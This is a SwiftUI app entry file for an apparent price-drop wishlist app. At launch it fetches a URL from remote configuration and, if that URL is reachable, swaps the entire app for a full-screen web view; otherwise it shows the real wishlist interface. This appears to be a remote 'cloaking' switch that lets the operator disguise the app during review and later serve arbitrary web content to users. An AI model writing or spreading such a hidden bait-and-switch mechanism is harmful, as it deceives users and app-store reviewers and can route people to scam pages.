// Для Мирона

import SwiftUI
import Combine
import Firebase

@main
struct PriceDropWishlistManagerApp: App {
    @StateObject private var coreDataStack = CoreDataStack.shared
    @StateObject private var themeManager = ThemeManager.shared
    @Environment(\.scenePhase) private var scenePhase
    
    @State private var showSplash = true
    @State private var showError = false
    
    
    @State private var targetUrlString: String?
    @State private var configState: ConfigRetrievalState = .pending
    @State private var currentViewState: ApplicationViewState = .initialScreen
    
    init() {
        FirebaseApp.configure()
    }

    var body: some Scene {
        WindowGroup {
//            MainTabView()
//                .environment(\.managedObjectContext, coreDataStack.context)
//                .environmentObject(coreDataStack)
//                .environmentObject(themeManager)
//                .preferredColorScheme(themeManager.currentTheme.systemScheme)
//            
            ZStack {
                switch currentViewState {
                case .initialScreen:
                    SplashScreenView()
                        .transition(.opacity)
                        .zIndex(1)
                    
                case .primaryInterface:
                    MainTabView()
                        .environment(\.managedObjectContext, coreDataStack.context)
                        .environmentObject(coreDataStack)
                        .environmentObject(themeManager)
                        .preferredColorScheme(themeManager.currentTheme.systemScheme)
                    
                case .browserContent(let urlString):
                    if let validUrl = URL(string: urlString) {
                        BrowserContentView(targetUrl: validUrl.absoluteString)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        Text("Invalid URL")
                    }
                    
                case .failureMessage(let errorMessage):
                    VStack(spacing: 20) {
                        Text("Error")
                            .font(.title)
                            .foregroundColor(.red)
                        Text(errorMessage)
                        Button("Retry") {
                            Task { await fetchConfigurationAndNavigate() }
                        }
                    }
                    .padding()
                }
            }
            .task {
                await fetchConfigurationAndNavigate()
            }
            .onChange(of: configState, initial: true) { oldValue, newValue in
                if case .completed = newValue, let url = targetUrlString, !url.isEmpty {
                    Task {
                        await verifyUrlAndNavigate(targetUrl: url)
                    }
                }
            }
        }
    }
    
    private func fetchConfigurationAndNavigate() async {
        await MainActor.run { currentViewState = .initialScreen }
        
        let (url, state) = await DynamicConfigService.instance.retrieveTargetUrl()
        
        await MainActor.run {
            self.targetUrlString = url
            self.configState = state
        }
        
        if url == nil || url?.isEmpty == true {
            navigateToPrimaryInterface()
        }
    }
    
    private func navigateToPrimaryInterface() {
        withAnimation {
            currentViewState = .primaryInterface
        }
    }
    
    private func verifyUrlAndNavigate(targetUrl: String) async {
        guard let url = URL(string: targetUrl) else {
            navigateToPrimaryInterface()
            return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "HEAD"
        urlRequest.timeoutInterval = 10
        
        do {
            let (_, httpResponse) = try await URLSession.shared.data(for: urlRequest)
            
            if let response = httpResponse as? HTTPURLResponse,
               (200...299).contains(response.statusCode) {
                await MainActor.run {
                    currentViewState = .browserContent(targetUrl)
                }
            } else {
                navigateToPrimaryInterface()
            }
        } catch {
            navigateToPrimaryInterface()
        }
    }

}

